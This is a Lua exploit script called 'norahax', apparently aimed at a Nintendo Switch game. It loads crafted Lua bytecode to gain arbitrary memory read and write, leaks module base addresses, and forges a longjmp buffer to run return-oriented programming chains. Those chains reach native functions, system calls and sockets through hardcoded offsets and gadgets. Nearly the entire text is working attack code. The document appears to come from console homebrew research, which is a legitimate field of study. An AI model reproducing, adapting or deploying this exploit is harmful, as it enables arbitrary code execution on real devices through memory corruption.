local function fatal(err)
	local okfmt, msg = pcall(tostring, err)
	if not okfmt then
		msg = "<unprintable error>"
	end
	pcall(print, "[!] fatal: " .. msg)
	return msg
end

local function addrof(o)
	local s = tostring(o)
	local i = s:find("0x")
	if not i then
		return nil
	end
	return tonumber(s:sub(i + 2), 16)
end
local function f2i(x)
	return x * 2 ^ -52 * 2 ^ -1022
end
local function i2f(x)
	return x * 2 ^ 52 * 2 ^ 1022
end

local offsets_main = {
	luaB_print = 0x129020,
	luaB_auxwrap = 0x129e80,
	-- luaD_rawrunprotected's setjmp return
	luaD_rawrunprotected_setjmp_va = 0x12fc7c,
	malloc = 0x228fe0,
	free = 0x229040,
}

local offsets_sdk = {
	-- dynsym longjmp
	longjmp = 0x477ea4,
	-- ThreadManagerImplByHorizon::CreateThread
	-- x1=ThreadType*, x2=fn, w3=core; x0=(unused)
	thread_impl_create = 0x0b39b0,
	-- ThreadManagerImplByHorizon::StartThread
	-- x1=ThreadType* (reads [t+0x1b8])
	thread_impl_start = 0x0b3c10,
	-- ldp x3,x4,[sp,#0x10]; ldp x1,x2,[sp],#0x20; ret
	thread_impl_pop_x1_x4 = 0x477dac,
	-- svc #0x0a ; ret
	svc_exit_thread = 0x0d96cc,
	-- svc #0x0b ; ret
	svc_sleep_thread = 0x0d96d4,
	-- svc #0x27 ; ret
	svc_output_debug_string = 0x0d9814,
	-- svc #0x29 veneer: x0=&out, x1=type, x2=handle, x3=subid
	svc_get_info = 0x0d9824,
	-- svc #0x21 ; ret   (calling thread's TLS message buffer, 0x100 bytes)
	svc_send_sync = 0x0d97cc,
	-- svc #0x22 ; ret   (x0=buffer, x1=size, x2=handle; explicit RW page)
	svc_send_sync_user = 0x0d97d4,
	-- svc #0x18 ; ret   (x0=&out, x1=&handle, x2=n, x3=ns)
	svc_wait_sync = 0x0d9774,
	-- svc #0x16 ; ret   (x0=handle)
	svc_close_handle = 0x0d9764,
	-- svc #0x34 ; ret   (x0=addr, x1=ArbitrationType, x2=value,
	-- x3=timeout_ns; 0 is an immediate TimedOut, negative is infinite)
	svc_wait_for_address = 0x0d989c,
	-- svc #0x35 ; ret   (x0=addr, x1=SignalType, x2=value, x3=count;
	-- count <= 0 wakes every waiter)
	svc_signal_to_address = 0x0d98a4,
	-- WaitLightEvent's svcWaitForAddress block, entered at mov x3,#-1:
	-- x19=addr, WaitIfEqual on value 1, infinite timeout, returns through
	-- a 0x40-byte caller frame.  g_call3_void zeroes x3, so this is the
	-- only reachable infinite-timeout wait in the SDK.
	wait_for_address_eq1_inf = 0x0aa86c,
	-- mrs x0,tpidrro_el0 ; ret
	get_message_buffer_on_tls = 0x0bfea0,
	-- nn::fs::detail lazy singleton (.bss)
	fs_singleton = 0x0b16900,
	-- singleton +0x20: cached SharedPointer<IFileSystemProxy> payload
	fs_proxy = 0x020,
	-- singleton +0x3a8: session HandleAllocator free-list head
	fs_session_pool = 0x03a8,
	-- proxy +0x18: CMIF domain object id
	fs_proxy_domain_id = 0x018,
	-- nn::fs::CommitSaveData
	fs_commit_save_data = 0x05ae70,
	-- nn::os::GetThreadPriority(ThreadType const*)
	get_thread_priority = 0x0ad7f0,
	-- nn::err::ShowApplicationError
	show_application_error = 0x1a0f60,
	-- nn::socket::*
	socket_initialize = 0xc1c80,
	socket_socket = 0xc18e0,
	socket_bind = 0xc17d0,
	socket_listen = 0xc1860,
	socket_accept = 0xc17b0,
	socket_recv = 0xc1720,
	socket_send = 0xc1760,
	socket_close = 0xc1930,
	socket_fcntl = 0xc1980,
	socket_get_last_error = 0xc1b80,
	-- nn::socket::detail::SocketNtop
	inet_ntop = 0xd3820,
	-- nn::nifm::*
	nifm_initialize = 0x1e0220,
	nifm_get_current_primary_ip_address = 0x1e0f60,
}

-- The arb r/w needs 24 bytes for a w/r cycle, so the two GOT offsets after the
-- anchor get trashed; the symbols are lazy bound.  acos trashes atan2, atan.
local got_anchors_sdk = {
	acos = { got = 0x3ad9e8, va = 0x47f008 },
}

local gadgets = {
	-- ldr x0,[sp,#8]; ldp x29,x30,[sp,#0x10]; add sp,#0x20; ret
	g_load_x0 = 0x076780,
	-- ldp x29,x30,[sp,#0x10]; ldr x19,[sp,#8]; ldr d8,[sp],#0x20; ret
	g_load_x19 = 0x01eee8,
	-- ldr x0,[x19]; ldp x29,x30,[sp,#0x10]; ldp x20,x19,[sp],#0x20; ret
	g_peek_x0_x19 = 0x1463c8,
	-- str x0,[x19]; ldp x29,x30,[sp,#0x10]; ldp x20,x19,[sp],#0x20; ret
	g_store_x0_x19 = 0x066970,
	-- ldr x8,[x0,#8]; x0=[x19+0x50]; x3=0; x1,x2=[x19+0x20]; x4=0;
	-- blr x8; ldp x29,x30,[sp,#0x10]; mov w0,#0; ldp x20,x19,[sp],#0x20; ret
	g_call3_void = 0x0b6970,
	-- ldp x8,x9,[sp]; ldp x29,x30,[sp,#0x20]; stp x8,x9,[x19];
	-- ldr x19,[sp,#0x10]; add sp,#0x30; ret
	g_load_x8_call5 = 0x22391c,
	-- ldr x2,[sp,#8]; ldp x29,x30,[sp,#0x10]; mov x1,x0; mov x0,x19;
	-- ldr x19,[sp],#0x20; br x2
	g_branch_x2 = 0x1c35d4,
	-- blr x8; ldp x29,x30,[sp,#0x10]; ldr x19,[sp],#0x20; ret
	g_blr_x8_keep_x0 = 0x002f20,
}

local frames = {
	load_x0 = { x0 = 0x08, x29 = 0x10, x30 = 0x18, size = 0x20 },
	load_x19 = { x19 = 0x08, x29 = 0x10, x30 = 0x18, size = 0x20 },
	store = { x20 = 0x00, x19 = 0x08, x29 = 0x10, x30 = 0x18, size = 0x20 },
	peek = { x20 = 0x00, x19 = 0x08, x29 = 0x10, x30 = 0x18, size = 0x20 },
	call3 = { x20 = 0x00, x19 = 0x08, x29 = 0x10, x30 = 0x18, size = 0x20 },
}

local offsets_lua = {
	errorjmp = 0x0a8, -- lua_State.errorJmp
	errfunc = 0x0b0, -- lua_State.errfunc (the tag word of errorJmp)
	lj_b = 0x008, -- lua_longjmp.b (jmp_buf)
	lj_status = 0x140, -- lua_longjmp.status
	jmpbuf_scan = 0x130, -- scan bound inside lua_longjmp
	lua_errrun = 2, -- LUA_ERRRUN
}

-- Memory map for the scratch string's data area (0x4000 bytes).
local layout = {
	rop_backup = 0x000, -- pristine copy of the live jmp_buf
	rop_forged = 0x200, -- forged lua_longjmp (b at +8)
	rop_chain = 0x400,
	rop_chain_size = 0x300,
	rop_result = 0x700, -- x0 result cell of the call chain
	rop_marker = 0x710, -- g_store_x0_x19's extra [x19+0x10] write
	rop_scratch = 0x730, -- the call path's x19 scratch cell
	rop_ounce = 0x750, -- svcGetInfo out cell
	main_calls = 0xC00, -- g_call3_void descriptor pool
	main_calls_size = 0x400,
	arb_rw = 0x900, -- the arb r/w self-test cell
	slack = 0x10,
}

local function setup()
	collectgarbage("stop")

	print("[*] norahax by alula and KurisuWaifu")
	print("[*] sending big thanks to: Gezine, kurumuz, zecoxao, DialingSpoon")

	print("[+] setting up initial primitives...")
	local HELPER_READ =
		"\27\76\117\97\81\0\1\4\8\4\8\0\13\0\0\0\0\0\0\0\64\104\101\108\112\101\114\95\114\101\97\100\0\0\0\0\0\0\0\0\0\0\1\0\4\5\0\0\0\164\0\0\0\0\0\0\1\0\0\0\0\156\128\128\0\158\0\0\1\0\0\0\0\1\0\0\0\4\0\0\0\0\0\0\0\64\112\48\0\0\0\0\0\0\0\0\0\2\0\0\6\7\0\0\0\164\0\0\0\4\0\0\0\68\0\128\0\192\0\128\0\156\64\0\1\4\0\0\0\30\0\0\1\0\0\0\0\1\0\0\0\4\0\0\0\0\0\0\0\64\112\49\0\0\0\0\0\0\0\0\0\1\1\0\2\2\0\0\0\8\0\0\0\30\0\128\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\0\0\0\3\0\0\0\0\0\0\0\117\118\0\0\0\0\0\0\0\0\0\2\0\0\0\3\0\0\0\0\0\0\0\117\118\0\3\0\0\0\0\0\0\0\117\118\0\0\0\0\0\0\0\0\0\0\0\0\0"
	local HELPER_WRITE =
		"\27\76\117\97\81\0\1\4\8\4\8\0\14\0\0\0\0\0\0\0\64\104\101\108\112\101\114\95\119\114\105\116\101\0\0\0\0\0\0\0\0\0\0\2\0\6\6\0\0\0\164\0\0\0\0\0\0\1\0\0\0\0\192\0\128\0\156\64\0\1\30\0\128\0\0\0\0\0\1\0\0\0\5\0\0\0\0\0\0\0\64\112\48\119\0\0\0\0\0\0\0\0\0\2\1\0\6\7\0\0\0\164\0\0\0\4\0\0\0\68\0\128\0\192\0\128\0\156\64\0\1\8\0\0\0\30\0\128\0\0\0\0\0\1\0\0\0\4\0\0\0\0\0\0\0\64\112\49\0\0\0\0\0\0\0\0\0\1\1\0\2\2\0\0\0\8\0\0\0\30\0\128\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\0\0\0\3\0\0\0\0\0\0\0\117\118\0\0\0\0\0\0\0\0\0\2\0\0\0\3\0\0\0\0\0\0\0\117\118\0\3\0\0\0\0\0\0\0\117\118\0\0\0\0\0\0\0\0\0\0\0\0\0"
	local HR = assert(loadstring(HELPER_READ))
	local HW = assert(loadstring(HELPER_WRITE))

	local function prim(target)
		local T = {}
		T[f2i(0x1111)] = true
		T[f2i(target)] = true
		return T
	end
	local function r64(target)
		local v = HR(prim(target))
		if type(v) == "number" then
			return i2f(v)
		end
		return nil, type(v)
	end
	local function w64(target, qword)
		HW(prim(target), f2i(qword))
	end

	local function destructive_read(a)
		w64(a + 0x8, 3) -- tt = LUA_TNUMBER
		return r64(a)
	end
	local function save_cf(a)
		return destructive_read(a + 0x20)
	end

	local scratch_str = string.rep("\0", 0x4000)
	_G._pinned_scratch = scratch_str

	local box = { 0, 0 }
	_G._pinned_box = box
	local box_addr = addrof(box)
	assert(box_addr, "addrof(box) failed")
	w64(box_addr + 0x20, 3) -- tag slot for the array-pointer read below
	local box_array = r64(box_addr + 0x18)
	assert(box_array and box_array ~= 0, "box has no array part")
	box[1] = scratch_str
	local scratch_ts = destructive_read(box_array)
	box[1] = 0
	assert(scratch_ts and scratch_ts ~= 0, "scratch TString unreadable")
	local heap = scratch_ts + 0x18 -- TString data area

	local rw_test = heap + layout.arb_rw
	w64(rw_test, 0x12676721372137)
	local sv = r64(rw_test)
	print("[+] testing arb rw")
	assert(sv == 0x12676721372137)

	print("[*] leaking module bases")

	local anchor_co = coroutine.wrap(function() return true end)
	local anchor_addr = addrof(anchor_co)
	assert(anchor_addr, "addrof(coroutine.wrap) failed")
	local anchor_f = save_cf(anchor_addr)
	anchor_co = nil -- the damaged upvalue must never be traversed
	assert(anchor_f and anchor_f ~= 0, "anchor closure read failed")
	local main_base = anchor_f - offsets_main.luaB_auxwrap
	assert(main_base % 0x1000 == 0, "failed to leak main module base")

	print(string.format("[+] main @ 0x%x", main_base))
    
	math.acos(0) -- lazy bound!!!
	local anchor_func = got_anchors_sdk.acos
	local sdk_got_addr = main_base + anchor_func.got
	local sdk_func = destructive_read(sdk_got_addr)
	local sdk_base = sdk_func - anchor_func.va
	assert(sdk_base % 0x1000 == 0, "failed to leak sdk module base")

	print(string.format("[+] sdk  @ 0x%x", sdk_base))

    local function run_rop(opts)
        opts = opts or {}
        local co = coroutine.create(function()
            local L = addrof(coroutine.running())
            local ctx = {
                L = L
            }

            local ok, err = pcall(function()
				-- errfunc is the tag word of errorJmp; the read needs it and the
				-- write is restored right after
                w64(L + offsets_lua.errfunc, 3)
                local live = r64(L + offsets_lua.errorjmp)
                w64(L + offsets_lua.errfunc, 0)

                ctx.live = live
                assert(live, "no live errorJmp")

                if opts.capture_jmpbuf then
                    local slots = {}
                    for off = offsets_lua.jmpbuf_scan, 0, -8 do
                        local slot = live + offsets_lua.lj_b + off

                        w64(slot + 8, 3)
                        slots[off] = r64(slot)
                        assert(slots[off] ~= nil, "jmp_buf read failed")
                    end

                    w64(L + offsets_lua.errfunc, 0)

                    local pc_off, sp_off
                    for off = offsets_lua.jmpbuf_scan, 0, -8 do
						if slots[off] == main_base + offsets_main.luaD_rawrunprotected_setjmp_va then
                            pc_off = off
                        end
                        if slots[off] == live - 8 then
                            sp_off = off
                        end
                    end

                    assert(pc_off and sp_off, "unrecognised jmp_buf layout")

					ctx.slots, ctx.pc_off, ctx.sp_off = slots, pc_off, sp_off
                end

                opts.build(ctx)
                opts.fire(ctx)
            end)
        end)

        return coroutine.resume(co)
    end

	local function new_emitter(chain_base, desc_base, desc_end, chain_end, scratch)
		local E = {
			cursor = chain_base,
			desc = desc_base,
			desc_end = desc_end,
			chain_end = chain_end,
			scratch = scratch or (heap + layout.rop_scratch),
			pending = nil,
			words = {}
		}
		-- Every helper write stores a TValue: the eight-byte value plus a
		-- four-byte tag at +8, so a write spills into the cell above it.  Frames
		-- are therefore recorded and flushed in ascending address order, which
		-- lets each frame's own write correct the spill of the frame below it.
		local function put(addr, val)
			local w = E.words
			w[#w + 1] = { addr, val }
		end
		local function code(va)
			return main_base + va
		end
		function E:patch(va)
			if self.pending then
				put(self.pending, va)
			end
		end
		function E:g0(v)
			self:patch(code(gadgets.g_load_x0))
			local f = frames.load_x0
			local b = self.cursor
			put(b + f.x0, v or 0)
			put(b + f.x29, 0)
			self.cursor = b + f.size
			self.pending = b + f.x30
		end
		function E:g1(v)
			self:patch(code(gadgets.g_load_x19))
			local f = frames.load_x19
			local b = self.cursor
			put(b + f.x19, v or 0)
			put(b + f.x29, 0)
			self.cursor = b + f.size
			self.pending = b + f.x30
		end
		function E:g2(v20, v19)
			self:patch(code(gadgets.g_store_x0_x19))
			local f = frames.store
			local b = self.cursor
			put(b + f.x20, v20 or 0)
			put(b + f.x19, v19 or 0)
			put(b + f.x29, 0)
			self.cursor = b + f.size
			self.pending = b + f.x30
		end
		-- x0 = *src, then x0 -> *dst
		function E:peek(src, dst)
			self:g1(src)
			self:patch(code(gadgets.g_peek_x0_x19))
			local f = frames.peek
			local b = self.cursor
			put(b + f.x20, 0)
			put(b + f.x19, 0)
			put(b + f.x29, 0)
			self.cursor = b + f.size
			self.pending = b + f.x30
			self:g1(dst)
			self:g2(0, 0)
		end
		function E:call3(target, x0v, x1v, x2v)
			local t = self.desc
			local a = t + 0x40
			if t + 0x100 > self.desc_end then
				error("rop descriptor pool overflow", 0)
			end
			self.desc = t + 0x100
			put(t + 8, target)
			put(a + 0x20, x1v or 0)
			put(a + 0x28, x2v or 0)
			put(a + 0x50, x0v or 0)
			self:g0(t)
			self:g1(a)
			self:patch(code(gadgets.g_call3_void))
			local f = frames.call3
			local b = self.cursor
			put(b + f.x20, 0)
			put(b + f.x19, 0)
			put(b + f.x29, 0)
			self.cursor = b + f.size
			self.pending = b + f.x30
		end

		function E:call_native(target, a0, a1, a2, a3, a4, result_cell)
			local f = frames.load_x19
			self:patch(code(gadgets.g_load_x19))
			local b0 = self.cursor
			put(b0 + f.x19, self.scratch)
			put(b0 + f.x29, 0)
			put(b0 + f.x30, code(gadgets.g_load_x8_call5))
			self.cursor = b0 + f.size
			
			local b1 = self.cursor
			put(b1, target)
			put(b1 + 8, 0)
			put(b1 + 0x10, a0 or 0) -- new x19 = a0
			put(b1 + 0x18, 0)
			put(b1 + 0x20, 0) -- x29
			put(b1 + 0x28, code(gadgets.g_branch_x2))
			self.cursor = b1 + 0x30
			
			local b2 = self.cursor
			put(b2, 0) -- new x19 (unused by the x1..x4 restore)
			put(b2 + 8, sdk_base + offsets_sdk.thread_impl_pop_x1_x4)
			put(b2 + 0x10, 0)
			put(b2 + 0x18, code(gadgets.g_blr_x8_keep_x0))
			self.cursor = b2 + 0x20
			
			local b3 = self.cursor
			put(b3, a1 or 0)
			put(b3 + 8, a2 or 0)
			put(b3 + 0x10, a3 or 0)
			put(b3 + 0x18, a4 or 0)
			self.cursor = b3 + 0x20
			
			local b4 = self.cursor
			put(b4, result_cell or (heap + layout.rop_result)) -- x19 = result cell
			put(b4 + 8, 0)
			put(b4 + 0x10, 0)
			put(b4 + 0x18, code(gadgets.g_store_x0_x19))
			self.cursor = b4 + 0x20

			local b5 = self.cursor
			put(b5, 0)
			put(b5 + 8, 0)
			put(b5 + 0x10, 0)
			self.cursor = b5 + 0x20
			self.pending = b5 + f.x30
		end

		function E:flush()
			table.sort(self.words, function(x, y) return x[1] < y[1] end)
			for i = 1, #self.words do
				w64(self.words[i][1], self.words[i][2])
			end
			self.words = {}
		end
		return E
	end

	local rop_backup = heap + layout.rop_backup
	local rop_forged = heap + layout.rop_forged
	local rop_chain = heap + layout.rop_chain
	local longjmp_b = offsets_lua.lj_b

	local main_area = {
		chain = rop_chain,
		chain_end = heap + layout.rop_result - layout.slack,
		desc = heap + layout.main_calls,
		desc_end = heap + layout.main_calls + layout.main_calls_size
	}

	local function build_chain(area, emit)
		local E = new_emitter(area.chain, area.desc, area.desc_end, area.chain_end)

		-- entered at g_load_x19 with sp = the chain base, by the forged jmp_buf
		E:g1(0)
		emit(E)
		-- close the chain by unwinding through the pristine jmp_buf
		E:call3(sdk_base + offsets_sdk.longjmp, rop_backup, offsets_lua.lua_errrun, 0)

		if E.cursor > E.chain_end then
			error("rop chain overlaps its end", 0)
		end
		E:flush()
	end

	local function chain_builder(emit, chain_base, chain_end)
		local area = main_area
		if chain_base then
			area = {
				chain = chain_base,
				chain_end = chain_end,
				desc = heap + layout.main_calls,
				desc_end = heap + layout.main_calls + layout.main_calls_size
			}
		end
		return function(ctx)
			for off = 0, offsets_lua.jmpbuf_scan, 8 do
				w64(rop_backup + off, ctx.slots[off])
			end

			build_chain(area, emit)

			for off = 0, offsets_lua.jmpbuf_scan, 8 do
				w64(rop_forged + longjmp_b + off, ctx.slots[off])
			end

			w64(rop_forged + longjmp_b + ctx.pc_off, main_base + gadgets.g_load_x19)
			w64(rop_forged + longjmp_b + ctx.sp_off, area.chain)
			w64(ctx.live + offsets_lua.lj_status, offsets_lua.lua_errrun)
		end
	end

	local function fire8(ctx)
		w64(ctx.L + offsets_lua.errorjmp, rop_forged)
		w64(ctx.L + offsets_lua.errfunc, 0)
		error("meow", 0)
	end

	local function run_chain(emit, chain_base, chain_end)
		local rok, rerr = run_rop{
			build = function(ctx)
				return chain_builder(emit, chain_base, chain_end)(ctx)
			end,
			fire = fire8,
			capture_jmpbuf = true
		}
		if not rok then
			print("[!] chain coroutine failed: " .. tostring(rerr))
		end
	end

	local function native_call(target, a0, a1, a2, a3, a4, chain_base, chain_end)
		local RES = heap + layout.rop_result
		run_chain(function(E)
			E:call_native(target, a0, a1, a2, a3, a4, RES)
		end, chain_base, chain_end)
		w64(RES + 8, 3)
		return r64(RES)
	end

	local OUT = heap + layout.rop_ounce
	w64(OUT, 0)
	local is_ounce = native_call(sdk_base + offsets_sdk.svc_get_info,
		OUT, 32, 0xFFFF8001, 0, 0) == 0
	print("[*] running on:", is_ounce and "Ounce" or "NX")
	
	local RES = heap + layout.rop_result
	local node_probe = {}
	local node_probe_addr = addrof(node_probe)
	assert(node_probe_addr, "addrof(node probe) failed")
	run_chain(function(E)
		E:peek(node_probe_addr + 0x20, RES)
	end)
	w64(RES + 8, 3)
	local dummynode = r64(RES)
	assert(dummynode and dummynode ~= 0 and dummynode % 8 == 0,
		"could not read dummynode")
	w64(box_addr + 0x20, dummynode) -- node; the tag spills into lastfree
	w64(box_addr + 0x28, dummynode) -- lastfree; the tag spills into gclist

	-- TString* of a live string with no header writes at all: park it in the
	-- box's array slot 1 and read the raw eight bytes with the ROP peek.
	local function str_addr(s)
		assert(type(s) == "string", "str_addr wants a string")
		box[1] = s
		run_chain(function(E)
			E:peek(box_array, RES)
		end)
		w64(RES + 8, 3)
		local ts = r64(RES)
		box[1] = 0
		assert(ts and ts ~= 0, "str_addr read failed")
		return ts
	end

	local tls_addr = native_call(sdk_base + offsets_sdk.get_message_buffer_on_tls,
		0, 0, 0, 0, 0)
	print(string.format("[+] TPIDRRO_EL0=0x%x", tls_addr))

	local function wstr(addr, s)
		for i = 1, #s, 4 do
			local v = 0
			for j = 3, 0, -1 do
				v = v * 256 + (s:byte(i + j) or 0)
			end
			w64(addr + i - 1, v)
		end
	end

	local function alloc(size)
		return native_call(main_base + offsets_main.malloc, size, 0, 0, 0, 0)
	end

	local function free_block(ptr)
		run_chain(function(E)
			E:call3(main_base + offsets_main.free, ptr, 0, 0)
		end)
	end

	-- Deep SDK calls need a real stack: the default chain area is only a few
	-- hundred bytes.  Build the chain at the top of a 128 KiB block and let the
	-- callee grow down into the rest of it.
	local deep_stack
	local function call_deep(target, a0, a1, a2, a3, a4)
		if not deep_stack then
			deep_stack = alloc(0x20000)
			assert(deep_stack and deep_stack ~= 0, "deep stack allocation failed")
		end
		return native_call(target, a0, a1, a2, a3, a4,
			deep_stack + 0x1E000, deep_stack + 0x20000)
	end

	_G.n2h = {
		platform = is_ounce and "Ounce" or "NX",
		game_id = "nora",
		main_base = main_base,
		sdk_base = sdk_base,
		gadgets = gadgets,
		offsets_main = offsets_main,
		offsets_sdk = offsets_sdk,
		layout = layout,
		addrof = addrof,
		sdk = function(name)
			local va = offsets_sdk[name]
			assert(va, "unknown offset " .. tostring(name))
			return sdk_base + va
		end,
		peek = destructive_read,
		poke = w64,
		str_addr = str_addr,
		write_bytes = wstr,
		alloc = alloc,
		free = free_block,
		call_deep = call_deep,
		run_chain = run_chain,
		new_emitter = new_emitter,
		log = print,
	}
	collectgarbage("restart")
end

xpcall(setup, fatal)
